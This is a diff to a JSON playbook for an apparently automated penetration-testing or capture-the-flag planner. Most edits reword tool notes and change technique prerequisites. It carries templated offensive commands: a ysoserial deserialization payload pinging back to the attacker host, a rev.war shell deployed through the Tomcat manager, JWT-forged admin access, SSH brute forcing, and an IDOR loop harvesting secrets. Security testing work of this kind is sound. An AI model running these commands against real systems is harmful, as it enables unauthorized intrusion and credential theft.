@@ -47,7 +47,7 @@
         {
           "tool": "wfuzz",
           "run": "wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H \"Host: FUZZ.{{domain}}\" --hh 0 http://{{target}}/",
-          "note": "A wfuzz-based alternative (a frequent 0xdf pick). Here --hh hides by character count rather than byte size, so baseline it against a bogus Host value first."
+          "note": "A wfuzz-based alternative (a fast header-fuzzing option). Here --hh hides by character count rather than byte size, so baseline it against a bogus Host value first."
         }
       ]
     },
@@ -99,7 +99,7 @@
         {
           "tool": "gobuster",
           "run": "gobuster dir -u http://{{target}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,bak -o scans/gobuster.txt",
-          "note": "The long-standing alternative (0xdf leaned on it for years before feroxbuster). -x tacks on extension fuzzing; use -k for invalid TLS certificates."
+          "note": "The long-standing alternative (a classic recursive scanner alongside feroxbuster). -x tacks on extension fuzzing; use -k for invalid TLS certificates."
         },
         {
           "tool": "cewl",
@@ -115,7 +115,7 @@
     },
     {
       "id": "web-access-blocked",
-      "title": "Web Request Blocked — WAF, Rate Limit, or Wrong Scheme",
+      "title": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme",
       "tool": "curl",
       "tools": [
         "curl",
@@ -624,7 +624,7 @@
     {
       "id": "ssti",
       "title": "Server-Side Template Injection (SSTI)",
-      "hypothesis": "When user input passes through a template engine, {{7*7}} coming back as 49 shows the server is running template code, and template code leads to RCE. The 0xdf corpus runs into Jinja2, Twig, and ASP over and over. Spotting it is the same across engines, but exploiting it is engine-specific, so pin down the engine first (its template-error output usually names it).",
+      "hypothesis": "When user input passes through a template engine, {{7*7}} coming back as 49 shows the server is running template code, and template code leads to RCE. Jinja2, Twig, and classic ASP/Razor appear frequently in the field. Spotting it is the same across engines, but exploiting it is engine-specific, so pin down the engine first (its template-error output usually names it).",
       "tool": "curl",
       "tools": [
         "curl"
@@ -684,7 +684,8 @@
       ],
       "produces": [
         "loot.files",
-        "web.ssrf_confirmed"
+        "web.ssrf_confirmed",
+        "web.xxe_confirmed"
       ],
       "priority": 66,
       "proves": "confirms retrieved files and a working SSRF",
@@ -728,7 +729,8 @@
       "os": [],
       "requires_all": [],
       "requires_any": [
-        "http.reachable"
+        "http.reachable",
+        "web.deserial_confirmed"
       ],
       "produces": [
         "foothold.webshell"
@@ -747,7 +749,7 @@
         {
           "tool": "ysoserial",
           "run": "ysoserial CommonsCollections5 'ping -c 3 {{lhost}}' | base64 -w0",
-          "note": "Java: build a gadget-chain payload. Fire a pingback at your listener to verify execution before staging anything larger, 0xdf does exactly this each time."
+          "note": "Java: build a gadget-chain payload. Fire a pingback at your listener to verify execution before staging anything larger to confirm outbound reachability first."
         },
         {
           "tool": "curl",
@@ -770,7 +772,7 @@
     {
       "id": "jwt-attacks",
       "title": "JWT Attacks",
-      "hypothesis": "A JSON Web Token is no stronger than its signing secret and the code that verifies it. The escalation ladder: (1) decode it and read the claims, (2) attempt alg:none, (3) crack weak HMAC secrets offline, (4) where you've obtained the app source (git-exposed, LFI), lift the hardcoded secret and mint admin tokens, the outcome 0xdf sees most often.",
+      "hypothesis": "A JSON Web Token is no stronger than its signing secret and the code that verifies it. The escalation ladder: (1) decode it and read the claims, (2) attempt alg:none, (3) crack weak HMAC secrets offline, (4) where you've obtained the app source (git-exposed, LFI), lift the hardcoded secret and mint admin tokens, which is often the fastest path to privilege escalation.",
       "tool": "hashcat",
       "tools": [
         "hashcat",
@@ -779,7 +781,8 @@
       "os": [],
       "requires_all": [],
       "requires_any": [
-        "http.reachable"
+        "http.reachable",
+        "web.source"
       ],
       "produces": [
         "web.jwt_secret",
@@ -889,7 +892,7 @@
         "foothold.webshell"
       ],
       "priority": 56,
-      "proves": "an uploaded, executing webshell on the target — a foothold as the web service account",
+      "proves": "an uploaded, executing webshell on the target - a foothold as the web service account",
       "does_not_prove": "that every path is writable, only the one you wrote to; nor any privilege beyond the web user",
       "report": {
         "finding": "Arbitrary File Upload via HTTP PUT / WebDAV",
@@ -940,7 +943,7 @@
         "credential.candidate"
       ],
       "priority": 55,
-      "proves": "what the bypassed authorization grants — privileged functionality, dumped accounts, and often an admin-only path to code execution",
+      "proves": "what the bypassed authorization grants - privileged functionality, dumped accounts, and often an admin-only path to code execution",
       "does_not_prove": "a shell by itself; the bypass opens the door, the upload/config/RCE feature behind it is what lands the foothold",
       "report": {
         "finding": "Privilege Escalation via Broken Access Control",
@@ -953,7 +956,7 @@
         {
           "tool": "curl",
           "run": "curl -s {{url}}/admin -H \"Authorization: Bearer {{forged_jwt}}\"",
-          "note": "Reach the admin surface with the forged token or bypassed session. Map every privileged action it exposes — user management, settings, uploads."
+          "note": "Reach the admin surface with the forged token or bypassed session. Map every privileged action it exposes - user management, settings, uploads."
         },
         {
           "tool": "curl",
@@ -986,7 +989,8 @@
       "requires_any": [
         "http.reachable",
         "vuln.nosqli",
-        "web.param_candidate"
+        "web.param_candidate",
+        "web.nosqli_confirmed"
       ],
       "produces": [
         "web.authz_bypass",
@@ -994,7 +998,7 @@
       ],
       "priority": 44,
       "proves": "a NoSQL auth bypass (application-admin login) and, via $regex extraction, candidate password material",
-      "does_not_prove": "admin rights inside the application only, not an OS shell or system-level privilege (access.admin/system) — and an extracted password is a candidate until a login validates it",
+      "does_not_prove": "admin rights inside the application only, not an OS shell or system-level privilege (access.admin/system) - and an extracted password is a candidate until a login validates it",
       "report": {
         "finding": "NoSQL Injection (Auth Bypass)",
         "severity": "high"
@@ -1053,7 +1057,7 @@
         {
           "tool": "curl",
           "run": "curl -u '{{user}}:{{password}}' 'http://{{target}}:8080/manager/text/deploy?path=/shell' --upload-file rev.war",
-          "note": "Deploy over the text API (the 0xdf tabby technique). The /shell path then hosts your JSP."
+          "note": "Deploy over the text API (useful when GUI manager access is restricted). The /shell path then hosts your JSP."
         },
         {
           "tool": "curl",
@@ -1156,8 +1160,8 @@
       "commands": [
         {
           "tool": "wpscan",
-          "run": "wpscan -e ap,t,tt,u --url http://{{target}} --api-token $WPSCAN_API",
-          "note": "Enumerate every plugin, theme, timthumb, and user. A no-cost API token from wpscan.com unlocks the vuln DB. The standard 0xdf scan."
+          "run": "wpscan -e ap,t,tt,u --url http://{{target}}",
+          "note": "Enumerate every plugin, theme, timthumb, and user. Add --api-token if you have a wpscan.com token for CVE enrichment. The standard comprehensive WordPress enumeration scan."
         },
         {
           "tool": "wpscan",
@@ -1377,7 +1381,7 @@
         {
           "tool": "hydra",
           "run": "hydra -L {{userlist}} -P {{wordlist}} ssh://{{target}}",
-          "note": "Always try the enumerated app users against SSH too — web and shell passwords are reused constantly, and an SSH hit is a direct foothold."
+          "note": "Always try the enumerated app users against SSH too - web and shell passwords are reused constantly, and an SSH hit is a direct foothold."
         }
       ],
       "requires_any": []
@@ -1418,7 +1422,7 @@
         {
           "tool": "curl",
           "run": "for i in $(seq 1000 1100); do curl -s -b \"{{session}}\" {{url}}/api/export?id=$i; done",
-          "note": "Pull each record and grep the responses for password, token, api_key, secret — export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list."
+          "note": "Pull each record and grep the responses for password, token, api_key, secret - export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list."
         }
       ],
       "requires_any": []
@@ -1491,7 +1495,8 @@
       "requires_any": [
         "web.upload_confirmed",
         "foothold.webshell",
-        "web.lfi_confirmed"
+        "web.lfi_confirmed",
+        "web.rce"
       ],
       "produces": [
         "access.shell",
@@ -1698,9 +1703,7 @@
       "tools": [
         "curl"
       ],
-      "requires_all": [
-        "web.lfi_confirmed"
-      ],
+      "requires_all": [],
       "produces": [
         "credential.candidate"
       ],
@@ -1733,7 +1736,10 @@
           "note": "A readable private key is a direct login; crack a passphrase with ssh2john if needed."
         }
       ],
-      "requires_any": []
+      "requires_any": [
+        "web.lfi_confirmed",
+        "web.xxe_confirmed"
+      ]
     },
     {
       "id": "aws-credential-abuse",
@@ -2099,8 +2105,8 @@
       "requires_all": [],
       "requires_any": [
         "service.jenkins",
-        "port:8080",
-        "web.fingerprint.jenkins"
+        "web.fingerprint.jenkins",
+        "vuln.jenkins"
       ],
       "produces": [
         "loot.files",
@@ -2154,6 +2160,7 @@
         "linux",
         "windows"
       ],
+      "locus": "R",
       "requires_all": [],
       "requires_any": [
         "port:61616",
@@ -2207,8 +2214,7 @@
       ],
       "produces": [
         "loot.files",
-        "objective.local_flag",
-        "objective.root_flag"
+        "credential.candidate"
       ],
       "priority": 86,
       "phase": "exploit",
@@ -2473,7 +2479,8 @@
       "phase": "access",
       "requires_any": [
         "http.reachable",
-        "web.tech"
+        "web.tech",
+        "web.deserial_confirmed"
       ],
       "produces": [
         "foothold.linux",
@@ -2994,10 +3001,14 @@
         "windows",
         "linux"
       ],
-      "requires_all": [],
-      "requires_any": [
-        "port:21",
+      "requires_all": [
         "ftp.anon_write"
+      ],
+      "requires_any": [
+        "port:80",
+        "port:443",
+        "port:8080",
+        "http.reachable"
       ],
       "produces": [
         "foothold.webshell"
@@ -3045,10 +3056,9 @@
       ],
       "requires_all": [],
       "requires_any": [
-        "port:80",
-        "port:443",
         "vuln.gitea",
-        "http.reachable"
+        "web.authz_bypass",
+        "web.server"
       ],
       "produces": [
         "credential.available",
@@ -3146,7 +3156,8 @@
       "requires_any": [
         "port:8080",
         "vuln.myfaces_jsf",
-        "http.reachable"
+        "http.reachable",
+        "web.deserial_confirmed"
       ],
       "produces": [
         "foothold.windows",
@@ -3198,7 +3209,8 @@
         "port:3000",
         "port:80",
         "vuln.node_serialize",
-        "http.reachable"
+        "http.reachable",
+        "web.deserial_confirmed"
       ],
       "produces": [
         "foothold.linux"
@@ -3246,7 +3258,7 @@
       "requires_any": [
         "vuln.usermin",
         "vuln.usermin_rce",
-        "port:20000"
+        "service.usermin"
       ],
       "produces": [
         "foothold.linux",
